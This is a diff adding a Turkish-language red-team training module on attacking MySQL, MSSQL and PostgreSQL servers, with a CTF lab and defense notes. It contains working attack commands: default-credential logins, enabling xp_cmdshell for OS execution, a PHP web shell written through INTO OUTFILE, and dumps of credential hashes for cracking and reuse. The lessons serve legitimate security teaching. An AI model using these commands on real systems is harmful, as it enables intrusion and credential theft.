@@ -1,0 +1,120 @@
+{
+  "id": "database-servers",
+  "slug": "database-servers",
+  "title": "Veritabanı Sunucusu Saldırıları",
+  "subtitle": "MySQL, MSSQL & PostgreSQL",
+  "description": "Veritabanı sunucularının saldırı yüzeyi: zayıf kimlik bilgileri, brute force, MSSQL xp_cmdshell ile RCE, UDF ile privesc ve sertleştirme. Temelden detaya.",
+  "team": "red-team",
+  "category": "Sunucu Saldırıları",
+  "phase": "Exploitation",
+  "icon": "🗄️",
+  "color": "#ef4444",
+  "tags": ["mysql", "mssql", "postgresql", "database", "xp_cmdshell", "udf", "sunucu"],
+  "modules": [
+    {
+      "id": "intro-enum",
+      "title": "Veritabanı Keşfi & Erişim",
+      "description": "DB türleri, portlar, kimlik bilgisi ve bağlantı",
+      "difficulty": "beginner",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Veritabanı Sunucularını Anlamak",
+          "content": "**Veritabanı sunucusu** uygulamaların verisini saklar — saldırganın en değerli hedeflerinden biridir (kullanıcı, parola, kart bilgisi).\n\n| DB | Port | Tipik platform |\n|----|------|----------------|\n| **MySQL/MariaDB** | 3306 | Linux/web |\n| **MSSQL** | 1433 | Windows |\n| **PostgreSQL** | 5432 | Linux |\n| **MongoDB** | 27017 | NoSQL |\n| **Redis** | 6379 | Cache (sık kimliksiz!) |\n\n**Saldırı vektörleri:**\n- **Zayıf/varsayılan kimlik bilgisi:** root: (boş), sa:sa\n- **Brute force:** Hydra/NetExec\n- **SQL Injection:** Web uygulamasından DB'ye ([SQLMap], [OWASP Injection])\n- **Komut çalıştırma:** MSSQL xp_cmdshell, MySQL UDF, PostgreSQL COPY\n- **Kimliksiz erişim:** Redis/MongoDB sık açık\n\n**İki giriş yolu:**\n1. Doğrudan DB portuna erişim (iç ağ)\n2. Web uygulamasındaki SQLi üzerinden\n\n> İlgili: [SQLMap], [OWASP Injection], [Hashcat] (DB'den çıkan hash'leri kırmak için)."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "DB Keşfi & Bağlantı",
+          "commands": [
+            {
+              "command": "nmap -p3306,1433,5432,6379,27017 -sV --script=mysql-info,ms-sql-info 10.10.10.1",
+              "description": "Veritabanı portlarını ve bilgilerini tara",
+              "tip": "Açık DB portu iç ağda yaygındır. mysql-empty-password scripti boş parolayı test eder."
+            },
+            {
+              "command": "mysql -h 10.10.10.1 -u root -p",
+              "description": "MySQL'e bağlan (zayıf/boş parola dene)",
+              "tip": "Bağlandıktan sonra: show databases; use db; select * from users; — kimlik bilgisi/hash ara."
+            },
+            {
+              "command": "netexec mssql 10.10.10.1 -u sa -p 'Parola1' --local-auth",
+              "description": "MSSQL'e kimlik doğrula (NetExec)",
+              "tip": "sa hesabı MSSQL'in admin'idir. -H ile hash, --local-auth yerel kimlik için.",
+              "flags": [
+                { "flag": "mssql", "description": "MSSQL protokolü" },
+                { "flag": "-q", "description": "SQL sorgusu çalıştır" }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "exploitation",
+      "title": "DB'den Sistem Ele Geçirme (RCE) + Lab",
+      "description": "xp_cmdshell, UDF ve veri çıkarma",
+      "difficulty": "advanced",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Veritabanından İşletim Sistemine",
+          "content": "Bir DB'ye yüksek yetkiyle erişince, çoğu zaman **işletim sisteminde komut** çalıştırılabilir.\n\n**MSSQL — xp_cmdshell:**\nMSSQL'in OS komutu çalıştıran saklı prosedürü. sa yetkisiyle açılıp komut çalıştırılır → SYSTEM shell. AD pentest'inde çok yaygın.\n\n**MySQL — UDF (User Defined Functions):**\nÖzel hazırlanmış .so/.dll ile MySQL'e OS komut yeteneği eklemek. FILE yetkisi varsa dosya okuma/yazma da mümkün (`LOAD_FILE`, `INTO OUTFILE` → web shell).\n\n**PostgreSQL:**\n`COPY ... TO/FROM PROGRAM` ile komut çalıştırma (sürüm 9.3+).\n\n**Veri çıkarma:** Asıl ödül genelde verinin kendisidir — kullanıcı tablosundaki hash'ler [Hashcat] ile kırılıp yeniden kullanılır (password reuse).\n\n> Web üzerinden SQLi ile DB ele geçirme için [SQLMap] (--os-shell) modülüne bak."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "RCE & Veri Çıkarma",
+          "commands": [
+            {
+              "command": "-- MSSQL xp_cmdshell (sa yetkisiyle):\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';",
+              "description": "MSSQL'de xp_cmdshell ile OS komutu çalıştır",
+              "output": "nt service\\mssqlserver",
+              "tip": "Kapalıysa önce etkinleştirilir. NetExec ile tek satır: netexec mssql HEDEF -u sa -p pass -x 'whoami'",
+              "warning": "Yalnızca yetkili/lab ortamında."
+            },
+            {
+              "command": "-- MySQL: web shell yazma (FILE yetkisi + yazılabilir webroot):\nSELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php';",
+              "description": "MySQL INTO OUTFILE ile web shell bırak",
+              "tip": "secure_file_priv kısıtlaması yoksa çalışır. Sonra http://hedef/sh.php?c=id ile RCE."
+            },
+            {
+              "command": "-- Kullanıcı hash'lerini çıkar:\nSELECT user, password FROM mysql.user;\n-- MSSQL:\nSELECT name, password_hash FROM sys.sql_logins;",
+              "description": "Veritabanından kimlik bilgisi/hash dök",
+              "tip": "Çıkan hash'leri Hashcat ile kır → password reuse ile başka servislere eriş."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: DB'den Shell'e",
+          "scenario": {
+            "title": "Erişim → RCE → Veri",
+            "objective": "Bir veritabanı sunucusuna zayıf kimlik bilgisiyle eriş, OS komut çalıştırma yeteneğiyle shell al ve kullanıcı hash'lerini çıkarıp kır.",
+            "environment": "TryHackMe/HTB makinesi (MSSQL veya MySQL)",
+            "difficulty": "advanced",
+            "steps": [
+              "nmap ile DB portunu tespit et (1433/3306/5432)",
+              "Zayıf/varsayılan kimlik bilgisiyle bağlan (sa, root)",
+              "MSSQL ise xp_cmdshell'i etkinleştir ve komut çalıştır",
+              "MySQL ise INTO OUTFILE ile web shell dene",
+              "Reverse shell al, sistemde ilerle",
+              "Kullanıcı tablosundan hash çıkar, Hashcat ile kır, yeniden kullan"
+            ],
+            "hints": [
+              "Redis/MongoDB sık kimliksizdir — önce kimliksiz dene",
+              "MSSQL servisi SYSTEM/servis hesabıyla çalışır → güçlü başlangıç",
+              "DB'den çıkan parolalar genelde başka yerlerde tekrar kullanılır"
+            ],
+            "defenseNote": "Savunma: Güçlü/benzersiz DB parolaları, varsayılan hesapları kaldır, xp_cmdshell'i kapat, en az yetki (FILE/sysadmin verme), DB'yi yalnızca uygulama sunucusuna aç (ağ kısıtlama), secure_file_priv ayarla, şifreleme ve denetim loglama uygula."
+          }
+        }
+      ]
+    }
+  ]
+}
